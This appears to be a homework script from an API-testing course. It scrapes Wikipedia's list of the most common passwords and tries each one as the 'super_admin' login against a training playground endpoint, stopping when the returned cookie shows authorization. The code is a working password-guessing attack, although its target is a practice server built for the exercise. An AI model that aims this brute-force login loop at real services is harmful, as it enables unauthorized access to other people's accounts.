import requests
from lxml import html
passwd = []
get_secret_password_homework = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
check_auth_cookie = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

response = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
tree = html.fromstring(response.text)
locator = '//*[contains(text(),"Top 25 most common passwords by year according to SplashData")]//..//td[@align="left"]/text()'
passwords = tree.xpath(locator)
for password in passwords:
    password = str(password).strip()
    if password not in passwd:
     passwd.append(password)
print(passwd)

for i in passwd:
    post_json = {"login":"super_admin", "password":f"{i}"}
    post = requests.post(get_secret_password_homework, data=post_json)
    cook = post.cookies
    check_cookie = requests.get(check_auth_cookie, cookies=cook)
    if check_cookie.text != "You are NOT authorized":
        print(f"password {i}, cookies {dict(cook)}:", check_cookie.text)

